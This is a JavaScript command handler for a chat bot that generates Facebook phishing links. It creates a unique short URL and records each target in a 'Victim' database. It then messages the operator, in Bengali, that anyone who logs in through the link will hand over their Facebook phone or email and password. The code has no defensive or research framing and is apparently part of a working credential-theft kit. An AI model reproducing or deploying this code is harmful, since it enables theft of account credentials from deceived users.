const { nanoid } = require('nanoid');
const Victim = require('../models/Victim');
const { getConfig, sendMessage, shortenUrl } = require('../utils/helpers');

module.exports = {
    execute: async (senderId, args, sendMessage) => {
        try {
            const config = await getConfig();
            const baseUrl = config.baseUrl || 'http://localhost:3000';

            const id = nanoid(10);
            const longLink = `${baseUrl}/fb/${id}`;

            // লিংক শর্ট করার চেষ্টা (ব্যর্থ হলে আসল লিংক)
            const shortLink = await shortenUrl(longLink);

            // ভিক্টিম ডাটাবেজে সেভ
            const victim = new Victim({
                id: id,
                fbId: senderId,
                type: 'fb',
                shortLink: shortLink || longLink,
                timestamp: new Date(),
                status: 'pending'
            });
            await victim.save();
            console.log(`✅ ফেক লগইন ভিক্টিম সেভ: ${id}`);

            // ============================================================
            // 🔥 কাস্টম মেসেজ (আপনার দেওয়া ফরম্যাট)
            // ============================================================
            const msg = `👤 ফেসবুক লিংক সফলভাবে তৈরি হয়েছে! 🎉

🔗 আপনার লিংক: ${longLink}

📌 কাজ করার নিয়ম:
কেউ এই লিঙ্কে প্রবেশ করে লগইন করলেই তার ফেসবুক অ্যাকাউন্টের নাম্বার/ইমেইল এবং পাসওয়ার্ড আপনার কাছে চলে আসবে। 💯
━━━━━━━━━━━━━━━━━━━━
🔗 Owner: m.me/2ndJohnnySins`;

            await sendMessage(senderId, msg);

        } catch (err) {
            console.error('❌ FB command error:', err);
            await sendMessage(senderId, '❌ লিংক তৈরি করতে ব্যর্থ: ' + err.message);
        }
    }
};